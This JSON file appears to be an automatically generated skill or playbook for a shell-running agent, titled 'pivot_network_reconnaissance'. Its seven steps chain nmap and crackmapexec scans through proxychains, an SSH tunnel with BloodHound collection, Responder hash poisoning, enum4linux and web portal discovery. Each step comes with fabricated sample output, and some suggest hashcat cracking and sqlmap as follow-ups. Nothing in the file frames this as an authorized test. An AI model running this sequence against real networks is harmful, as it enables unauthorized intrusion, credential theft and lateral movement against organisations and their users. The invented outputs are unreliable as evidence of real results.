{
  "name": "pivot_network_reconnaissance",
  "description": "Network reconnaissance and scanning through pivot points",
  "pattern": "pivot.*recon|pivot.*scan|internal.*network.*enum",
  "parameters": [
    "pivot_method",
    "target_network"
  ],
  "sequence": [
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "proxychains",
        "args": [
          "nmap",
          "-sT",
          "-Pn",
          "-p",
          "22,80,443,445,3389,5985",
          "192.168.10.0/24",
          "-oA",
          "pivot_scan"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n\nStarting Nmap 7.93 ( https://nmap.org )\nNmap scan report for 192.168.10.5\nHost is up (0.12s latency).\nPORT     STATE SERVICE\n445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server\n\nNmap scan report for 192.168.10.10\nHost is up (0.14s latency).\nPORT     STATE SERVICE\n445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server\n5985/tcp open  wsman\n\nNmap scan report for 192.168.10.20\nHost is up (0.13s latency).\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n443/tcp  open  https\n3389/tcp open  ms-wbt-server\n\nNmap scan report for 192.168.10.50\nHost is up (0.11s latency).\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https\n\nNmap done: 256 IP addresses (4 hosts up) scanned in 342.56 seconds\n\nInternal network discovery via proxy:\n  Live hosts: 4\n  Windows hosts: 3 (SMB/RDP)\n  Linux hosts: 2 (SSH/HTTP)\n  Files saved: pivot_scan.nmap, pivot_scan.xml, pivot_scan.gnmap"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "proxychains",
        "args": [
          "crackmapexec",
          "smb",
          "192.168.10.0/24"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] DLL init: proxychains-ng 4.16\n\nSMB         192.168.10.5    445    PIVOT-DMZ-01     [*] Windows Server 2019 Build 17763 x64 (name:PIVOT-DMZ-01) (domain:CORP) (signing:False) (SMBv1:False)\nSMB         192.168.10.10   445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:CORP) (signing:True) (SMBv1:False)\nSMB         192.168.10.20   445    WEB-SERVER-01    [*] Windows Server 2016 Build 14393 x64 (name:WEB-SERVER-01) (domain:CORP) (signing:False) (SMBv1:False)\nSMB         192.168.10.30   445    FILE-SERVER-01   [*] Windows Server 2019 Build 17763 x64 (name:FILE-SERVER-01) (domain:CORP) (signing:False) (SMBv1:False)\n\nActive Directory environment detected:\n  Domain: CORP\n  Domain Controller: DC01 (192.168.10.10) - SMB signing required\n  Member servers: 3\n    - PIVOT-DMZ-01 (192.168.10.5)\n    - WEB-SERVER-01 (192.168.10.20)\n    - FILE-SERVER-01 (192.168.10.30)\n\nNext steps:\n  - Enumerate domain users\n  - Test credentials\n  - Look for SMB shares"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "ssh -L 8080:192.168.10.10:88 user@10.10.10.100 -N -f && proxychains bloodhound-python -d corp.local -u guest -p '' -ns 192.168.10.10 -c All"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "INFO: Found AD domain: corp.local\nINFO: Connecting to LDAP server: dc01.corp.local\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 4 computers\nINFO: Connecting to LDAP server: dc01.corp.local\nINFO: Found 52 users\nINFO: Found 48 groups\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: PIVOT-DMZ-01.corp.local\nINFO: Querying computer: DC01.corp.local\nINFO: Querying computer: WEB-SERVER-01.corp.local\nINFO: Querying computer: FILE-SERVER-01.corp.local\nINFO: Done in 00M 45S\n\nBloodHound data collected through pivot:\n  Domain: corp.local\n  Users: 52\n  Groups: 48\n  Computers: 4\n  Trusts: 0\n\nOutput files:\n  20240115163000_users.json\n  20240115163000_groups.json\n  20240115163000_computers.json\n  20240115163000_domains.json\n\nImport to BloodHound:\n  neo4j console\n  bloodhound\n  Upload JSON files\n\nAttack path analysis ready"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "proxychains",
        "args": [
          "responder",
          "-I",
          "eth0",
          "-w",
          "-F"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "[proxychains] config file found: /etc/proxychains4.conf\n\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR & MDNS Responder 3.1.3.0\n\n  To support this project:\n  Patreon -> https://www.patreon.com/PythonResponder\n  Paypal  -> https://paypal.me/PythonResponder\n\n  Author: Laurent Gaffie (laurent.gaffie@gmail.com)\n  To kill this script hit CTRL-C\n\n[+] Poisoners:\n    LLMNR                      [ON]\n    NBT-NS                     [ON]\n    MDNS                       [ON]\n    DNS                        [ON]\n    DHCP                       [ON]\n\n[+] Servers:\n    HTTP server                [ON]\n    HTTPS server               [ON]\n    WPAD proxy                 [ON]\n    Auth proxy                 [ON]\n    SMB server                 [ON]\n\n[+] Listening for events through proxy...\n\n[SMB] NTLMv2-SSP Client   : 192.168.10.25\n[SMB] NTLMv2-SSP Username : CORP\\john.doe\n[SMB] NTLMv2-SSP Hash     : john.doe::CORP:1122334455667788:A1B2C3D4E5F6...\n\nNTLMv2 hash captured via pivot!\nCrack with: hashcat -m 5600 hash.txt rockyou.txt"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "for ip in 192.168.10.{1..254}; do (ping -c 1 -W 1 $ip > /dev/null && echo \"$ip is up\") & done; wait"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "192.168.10.1 is up\n192.168.10.5 is up\n192.168.10.10 is up\n192.168.10.20 is up\n192.168.10.25 is up\n192.168.10.30 is up\n192.168.10.50 is up\n192.168.10.100 is up\n\nLive host discovery complete:\n  Subnet: 192.168.10.0/24\n  Method: ICMP ping sweep\n  Live hosts: 8\n\nDiscovered hosts:\n  192.168.10.1   - Gateway/Router\n  192.168.10.5   - PIVOT-DMZ-01\n  192.168.10.10  - DC01 (Domain Controller)\n  192.168.10.20  - WEB-SERVER-01\n  192.168.10.25  - Unknown workstation\n  192.168.10.30  - FILE-SERVER-01\n  192.168.10.50  - Linux server\n  192.168.10.100 - Pivot point\n\nNote: This runs through SSHuttle/Ligolo tunnel\nNo proxy needed for ICMP with layer-3 tunnels"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "proxychains",
        "args": [
          "enum4linux",
          "-a",
          "192.168.10.10"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "[proxychains] config file found: /etc/proxychains4.conf\n\nStarting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ )\n\n ==========================\n|    Target Information    |\n ==========================\nTarget ........... 192.168.10.10\nRID Range ........ 500-550,1000-1050\nUsername ......... ''\nPassword ......... ''\n\n ==================================\n|    Enumerating Workgroup/Domain on 192.168.10.10    |\n ==================================\n[+] Got domain/workgroup name: CORP\n\n ====================================\n|    Session Check on 192.168.10.10    |\n ====================================\n[+] Server 192.168.10.10 allows sessions using username '', password ''\n\n =========================================\n|    Getting domain SID for 192.168.10.10    |\n =========================================\nDomain Name: CORP\nDomain Sid: S-1-5-21-1234567890-1234567890-1234567890\n\n ===================================\n|    Users on 192.168.10.10    |\n ===================================\nuser:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[john.doe] rid:[0x451]\nuser:[jane.smith] rid:[0x452]\nuser:[admin] rid:[0x453]\nuser:[sqlservice] rid:[0x454]\n\n ====================================\n|    Share Enumeration on 192.168.10.10    |\n ====================================\n\tSharename       Type      Comment\n\t---------       ----      -------\n\tADMIN$          Disk      Remote Admin\n\tC$              Disk      Default share\n\tIPC$            IPC       Remote IPC\n\tNETLOGON        Disk      Logon server share\n\tSYSVOL          Disk      Logon server share\n\nDomain enumeration via proxy:\n  Domain: CORP\n  Users found: 7\n  Shares: 5 (including SYSVOL/NETLOGON)\n  Guest access: Enabled"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "proxychains curl -s http://192.168.10.20 | grep -i 'login\\|admin\\|portal'"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.20:80 ... OK\n\n    <title>Corporate Web Portal - Login</title>\n    <h1>Welcome to Corporate Portal</h1>\n    <form action=\"/admin/login\" method=\"post\">\n        <input type=\"text\" name=\"username\" placeholder=\"Username\">\n        <input type=\"password\" name=\"password\" placeholder=\"Password\">\n    <a href=\"/admin/\">Admin Panel</a>\n    <a href=\"/portal/dashboard\">User Portal</a>\n\nWeb application discovered:\n  URL: http://192.168.10.20\n  Title: Corporate Web Portal - Login\n  Endpoints found:\n    - /admin/login\n    - /admin/\n    - /portal/dashboard\n\nNext steps:\n  proxychains nikto -h http://192.168.10.20\n  proxychains gobuster dir -u http://192.168.10.20 -w wordlist.txt\n  proxychains sqlmap -u http://192.168.10.20/admin/login --forms"
      }
    }
  ],
  "stats": {
    "uses": 0,
    "successes": 0,
    "failures": 0,
    "success_rate": 0.0
  },
  "created_by": "neural_mesh_v5.2_generator"
}
